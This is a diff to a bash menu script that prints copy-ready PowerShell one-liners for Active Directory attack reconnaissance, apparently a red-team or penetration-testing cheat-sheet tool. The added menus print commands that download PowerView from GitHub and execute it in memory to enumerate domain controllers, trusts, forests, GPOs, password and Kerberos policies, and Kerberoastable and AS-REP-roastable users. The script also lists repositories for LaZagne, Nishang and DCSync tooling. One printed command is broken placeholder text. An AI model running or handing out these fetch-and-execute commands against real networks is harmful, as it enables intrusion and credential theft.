@@ -54,8 +54,8 @@ LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/laza
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
 PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
 PowerSharpPack="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/";
-PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
-PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
+PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
+PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
 S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
 SecListsRepo="https://github.com/danielmiessler/SecLists/";
 
@@ -66,7 +66,7 @@ DownloadMethod="$iwr"
 
 Internal_Menu_Main(){
 
-    clear
+	clear
 
 echo -e ""
 echo -e ""
@@ -94,7 +94,7 @@ echo -ne " What would you like to do?
 
 Internal_Menu_Recon(){
 
-    clear
+	clear
     
 echo -e ""
 echo -e ""
@@ -123,7 +123,7 @@ echo -ne " Select Recon Type
 
 Internal_Menu_Recon_Local_Host(){
 
-    clear
+	clear
 
 echo -e ""
 echo -e ""
@@ -143,11 +143,12 @@ echo -e "${IBLUE}JAWS${RESTORE}"
 echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
 echo -e ""
 echo -e ""
+
 }
 
 Internal_Menu_Recon_Domain(){
 
-    clear
+	clear
     
 echo -e ""
 echo -e ""
@@ -156,22 +157,62 @@ echo -ne " Select Domain Recon Type
 
 
 
-        1)  ->  [ Domain Computers and Servers ]
-        2)  ->  [ Domain Users ]
+	1)  ->	[ Domain Controllers 		]
+        2)  ->  [ Domain Computers and Servers 	]
+        3)  ->	[ Domain Forests 		]
+        4)  ->	[ Domain GPO's			]
+        5)  -> 	[ Domain Policies 		]
+        6)  ->	[ Domain Trusts 		]
+        7)  ->  [ Domain Users 			]
 "
         read a
         case $a in
-	        1) Internal_Menu_Recon_Domain_Computers_Servers ;;
-	        2) Internal_Menu_Recon_Domain_Users ;;
+        	1) Internal_Menu_Recon_Domain_Controllers ;;
+	        2) Internal_Menu_Recon_Domain_Computers_Servers ;;
+	        3) Internal_Menu_Recon_Domain_Forests ;;
+	        4) Internal_Menu_Recon_Domain_GPO ;;
+	        5) Internal_Menu_Recon_Domain_Policies ;;
+	        6) Internal_Menu_Recon_Domain_Trusts ;;
+	        7) Internal_Menu_Recon_Domain_Users ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+}
+
+Internal_Menu_Recon_Domain_Controllers(){
+
+	clear
+	
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Domain Controller Enumeration${RESTORE}"
+echo -e ""  
+echo -e "${IBLUE}PowerView${RESTORE}" 
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainController"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomain | Select-Object 'PdcRoleOwner'"
+echo -e ""
+echo -e ""
+
+echo -ne  "Go Back?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
 }
 
 
+
 Internal_Menu_Recon_Domain_Computers_Servers(){
 
-    clear
+	clear
  
 echo -e ""
 echo -e ""
@@ -179,31 +220,135 @@ echo -e ""
 echo -e "${LGREEN}Computer Enumeration${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}All Computers${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname "
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname | Sort Name "
 echo -e ""
 echo -e "${IBLUE}Ping Alive Computers${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Ping"
 echo -e ""
 echo -e "${IBLUE}Computers by Operating System${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 10*'"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 7*'"  
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 10*'| Select Name,dnshostname,operatingsystem,operatingsystemversion "
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 7*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"  
 echo -e ""
 echo -e "${IBLUE}Servers by Operating System${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows Server*'"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows Server*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"
 echo -e ""
 echo -e ""
 
+}
+
+Internal_Menu_Recon_Domain_Forests(){
+
+	clear
+ 
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get details about current Forest"
+echo -e ""
+echo -e "${IBLUE}Get all Domains in current Forest${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain"
+echo -e ""
+echo -e "${IBLUE}Get global catalogs in current Forest${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestCatalog"
+echo -e ""
+echo -e "${IBLUE}Map Forest trusts${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestTrust"
+echo -e ""
+echo -e ""
 
 }
 
 
+Internal_Menu_Recon_Domain_GPO() {
+
+	clear
+ 
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${IBLUE}Get GPO's in Domain${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO | Select DisplayName"
+echo -e ""
+echo -e ""
+
+}
 
 
+Internal_Menu_Recon_Domain_Policies() {
+
+	clear
+ 
+echo -e ""
+echo -e ""
+echo -e ""   
+echo -e "${IBLUE}Password Policy${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'SystemAccess'"
+echo -e ""
+echo -e "${IBLUE}Kerberos Policy${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'KerberosPolicy'"
+echo -e ""
+echo -e ""
+
+}
+
+
+Internal_Menu_Recon_Domain_Trusts() {
+
+	clear
+ 
+echo -e ""
+echo -e ""
+echo -e ""   
+echo -e "${IBLUE}Get all Domains in Forest then list each Domain trust${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust"
+echo -e ""
+echo -e "${IBLUE}Map all reachable Domain trusts${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts -LDAP"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrust | Select SourceDomain,TargetDomain,TrustType,TrustDirection"
+echo -e ""
+echo -e "${IBLUE}List external trusts${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}"
+echo -e ""
+echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainTrust"
+echo -e ""
+echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-ForeignUser"
+echo -e ""
+echo -e ""
+
+}
+
+
+Internal_Menu_Recon_Domain_Users(){
+
+	clear
+	
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${IBLUE}User Properties${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,SamAccountName,Description | Sort Name"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties SamAccountName,Description | Sort SamAccountName"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
+echo -e ""
+echo -e "${IBLUE}Kerberoastable Users${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select name,ServicePrincipalName | Sort Name"
+echo -e ""
+echo -e "${IBLUE}AS-REP Roastable Users${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -PreauthNotRequired | Select Name | Sort Name"
+echo -e ""
+echo -e ""
+
+}
 
 
 Internal_Menu_Recon_Network(){
 
-    clear
+   	 clear
 
 echo -e ""
 echo -e ""
@@ -222,6 +367,7 @@ echo -e ""
 echo -e ""
 
 }
+
 
 Internal_Menu_Recon_File_Share() {
 
@@ -330,3 +476,4 @@ echo -ne "
 
 # Call the menu function
 Main_Menu
+
